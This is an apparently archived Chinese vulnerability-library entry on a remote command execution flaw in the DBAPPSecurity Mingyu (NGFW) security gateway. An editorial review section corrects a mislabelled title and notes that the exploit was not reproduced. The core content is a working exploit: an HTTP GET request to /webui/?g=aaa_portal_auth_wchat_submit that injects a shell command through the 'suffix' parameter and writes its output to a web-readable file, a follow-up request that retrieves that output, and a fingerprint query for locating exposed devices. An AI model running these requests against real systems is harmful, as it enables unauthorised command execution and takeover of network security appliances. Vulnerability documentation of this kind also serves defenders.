---
source: "wy876 漏洞文库"
id: "vw-2f840ddcbc67b9baedc9fe40"
entity_id: "ve-30d8561a4f6ee4a592853faf"
schema_version: "1"
fofa_unverified: "app.name="
title: "安恒明御安全网关 aaa_portal_auth_wchat_submit 资料（原题 config_reset 错配）"
product: "安恒明御安全网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie、固定webui目录，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3aaa_portal_auth_config_reset%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ggogol4vip7aq8zc"
source_status: "recorded"
canonical: "Web安全/安全设备/命令执行/安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞.md"
relation_type: "duplicate_of"
---

# 安恒明御安全网关 aaa_portal_auth_wchat_submit 资料（原题 config_reset 错配）

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：安恒明御NGFW
- 本文讨论：正文aaa_portal_auth_wchat_submit；标题aaa_portal_auth_config_reset无证据
- 版本、权限与配置前提：无Cookie、固定webui目录，版本未知
- 资料类型：端点标题错贴；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 简介和请求均为wchat_submit，不能证明config_reset
- 与611/613/614同正文，FOFA元数据残缺Hunter语法
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
- 标题按实际 aaa_portal_auth_wchat_submit 请求更正；原文件名中的另一入口不构成独立证据。真正 local_submit/config_reset 资料需查对应独立请求，不能由本篇复制推定。

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- config_reset真实内容和wchat响应待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ 特征


# 四、漏洞复现
```http
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```http
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggogol4vip7aq8zc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
